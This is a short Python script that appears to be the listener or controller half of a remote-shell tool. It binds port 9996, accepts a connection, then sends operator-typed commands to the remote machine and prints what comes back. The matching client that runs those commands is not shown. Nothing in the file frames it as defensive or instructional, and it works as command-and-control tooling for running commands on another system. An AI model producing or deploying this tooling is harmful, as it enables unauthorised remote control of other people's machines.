import socket
import sys


def create_socket():
    try:
       global host
       global port 
       global s 

       host=""
       port = 9996

       s = socket.socket()

    except socket.error as msg:
        print("Socket Creation error msg is "+str(msg))

#Binding the socket qand listening to connection 
def bind_socket():
    try:
       global host
       global port 
       global s 

       print("The binding port is "+str(port))

       s.bind((host,port))
       s.listen(5)


    except socket.error as msg:
        print("Socket Creation error msg is "+str(msg) + "\n"+"Trying......")   
        bind_socket()


def accept_socket():
    conn,address = s.accept()
    print("Connection is established with " + "IP" + address[0] + " and Port:"+str(address[1]))
    send_command(conn)
    conn.close()

def send_command(conn):
    while True:
        cmd = input()
        if cmd =='quit':
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) >0:
              conn.send(str.encode(cmd))   
              client_response = str(conn.recv(1024),"utf-8")
              print(client_response,"")


def main():
    create_socket()
    bind_socket()
    accept_socket()                               


main()
